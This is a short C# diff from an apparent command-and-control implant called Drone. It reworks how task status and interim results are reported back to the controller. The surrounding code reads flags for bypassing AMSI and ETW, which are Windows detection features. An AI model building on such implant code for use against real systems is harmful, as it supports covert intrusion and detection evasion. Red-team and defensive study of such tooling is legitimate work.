@@ -143,9 +143,6 @@ namespace Drone
             var token = new CancellationTokenSource();
             _taskTokens.Add(task.TaskGuid, token);
             
-            // send task running
-            SendTaskRunning(task.TaskGuid);
-            
             var bypassAmsi = _config.GetConfig<bool>("BypassAmsi");
             var bypassEtw = _config.GetConfig<bool>("BypassEtw");
 
@@ -204,6 +201,12 @@ namespace Drone
         private void SendTaskComplete(string taskGuid)
         {
             var update = new DroneTaskUpdate(taskGuid, DroneTaskUpdate.TaskStatus.Complete);
+            SendDroneTaskUpdate(update);
+        }
+        
+        public void SendUpdate(string taskGuid, string result)
+        {
+            var update = new DroneTaskUpdate(taskGuid, DroneTaskUpdate.TaskStatus.Running, Encoding.UTF8.GetBytes(result));
             SendDroneTaskUpdate(update);
         }
 
